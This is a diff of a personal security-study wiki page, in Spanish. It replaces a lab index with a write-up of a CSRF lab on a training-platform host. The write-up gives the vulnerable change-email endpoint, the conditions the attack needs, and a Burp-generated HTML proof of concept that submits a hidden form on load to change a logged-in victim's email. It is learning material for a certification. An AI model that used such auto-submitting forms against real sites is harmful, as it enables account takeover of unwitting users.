@@ -10,13 +10,9 @@
       
       
       
-        <link rel="canonical" href="https://igruntplay.github.io/BSCP/practicioner-labs-notes/">
+        <link rel="canonical" href="https://igruntplay.github.io/BSCP/csrf-practicioner-lab-notes-1/">
       
       
-        <link rel="prev" href="../BSCP/">
-      
-      
-        <link rel="next" href="../OAuth-account-hijacking-via-redirect_uri/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>BSCP Practitioner Labs - Grunt's Personal Wiki</title>
+        <title>CSRF PoC – Change Email - Grunt's Personal Wiki</title>
       
     
     
@@ -78,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#practicioner-labs-notes-index" class="md-skip">
+        <a href="#csrf-poc-change-email" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -114,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              BSCP Practitioner Labs
+              CSRF PoC – Change Email
             
           </span>
         </div>
@@ -828,10 +824,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -852,11 +846,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
@@ -877,7 +871,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -920,37 +914,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    BSCP Practitioner Labs
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../practicioner-labs-notes/" class="md-nav__link">
         
   
   
@@ -966,37 +933,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Tabla de contenidos
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#labs" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Labs
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1594,7 +1530,7 @@
 
 
   
-    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/practicioner-labs-notes.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
+    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/csrf-practicioner-lab-notes-1.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
     </a>
@@ -1602,22 +1538,56 @@
   
 
 
-<h1 id="practicioner-labs-notes-index">Practicioner labs notes index<a class="headerlink" href="#practicioner-labs-notes-index" title="Permanent link">&para;</a></h1>
-<p>Step 1: Complete all the listed practitioner-level labs
-Work through all of the labs in the list below, completing each lab in turn. There is no set time frame for completing the labs, but you must be able to do so without requiring access to the solutions provided.</p>
-<p>If you're unable to complete the lab you selected, go back to the learning materials and read through the content carefully, working through all the labs in that topic to make sure you're comfortable with the vulnerability class and exploit techniques it covers.</p>
-<hr />
-<ol>
-<li><a href="../lab-file-upload-web-shell-upload-via-extension-blacklist-bypass/">WebShell via extension blacklist bypass</a></li>
-<li><a href="../OAuth-account-hijacking-via-redirect_uri/">OAuth account hijacking via redirect_uri</a></li>
-</ol>
-<hr />
-<h2 id="labs">Labs<a class="headerlink" href="#labs" title="Permanent link">&para;</a></h2>
+<h1 id="csrf-poc-change-email">CSRF PoC – Change Email<a class="headerlink" href="#csrf-poc-change-email" title="Permanent link">&para;</a></h1>
+<h2 id="objetivo">Objetivo<a class="headerlink" href="#objetivo" title="Permanent link">&para;</a></h2>
+<p>Forzar a un usuario autenticado a enviar una solicitud <code>POST</code> a <code>/my-account/change-email</code> para cambiar su correo, sin su interacción explícita.</p>
+<h2 id="endpoint-vulnerable">Endpoint vulnerable<a class="headerlink" href="#endpoint-vulnerable" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="../cors-practicioner-lab-notes/">CORS</a></li>
-<li><a href="../csrf-practicioner-lab-notes-1/">CSRF-1</a></li>
-<li><a href="../csrf-practicioner-lab-notes-2/">CSRF-2</a></li>
+<li><strong>Método:</strong> <code>POST</code></li>
+<li><strong>Ruta:</strong> <code>/my-account/change-email</code></li>
+<li><strong>Host:</strong> <code>0ad0004604857369813b3949005d00b3.web-security-academy.net</code></li>
+<li><strong>Parámetro:</strong> <code>email</code></li>
 </ul>
+<h2 id="requisitos-para-que-funcione">Requisitos para que funcione<a class="headerlink" href="#requisitos-para-que-funcione" title="Permanent link">&para;</a></h2>
+<ul>
+<li>La víctima debe estar <strong>logueada</strong> en el sitio objetivo en el mismo navegador.</li>
+<li>La aplicación <strong>no</strong> debe validar un token CSRF efectivo (o debe ser inexistente/invalidable).</li>
+<li>Si el navegador envía cookies cross-site, depende del atributo <code>SameSite</code> de la cookie de sesión:</li>
+<li><code>SameSite=None</code> (con <code>Secure</code>) suele permitirlo.</li>
+<li><code>Lax/Strict</code> normalmente lo bloquea para <code>POST</code> cross-site.</li>
+</ul>
+<h2 id="prueba-de-concepto-html">Prueba de concepto (HTML)<a class="headerlink" href="#prueba-de-concepto-html" title="Permanent link">&para;</a></h2>
+<p>Guardar como <code>csrf-change-email.html</code> y servirlo desde cualquier origen (o desde el exploit server del lab).
+Utilicé el PoC generado por Burp Suite Professional, que incluye un formulario oculto que se autoenvía al cargar la página. Hay que poner que auto envíe el formulario para que el ataque se ejecute sin interacción del usuario.
+<div class="language-html highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0ad0004604857369813b3949005d00b3.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;gaspar&amp;#46;onesto&amp;#64;gmail&amp;#46;com&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div></p>
 
 
 
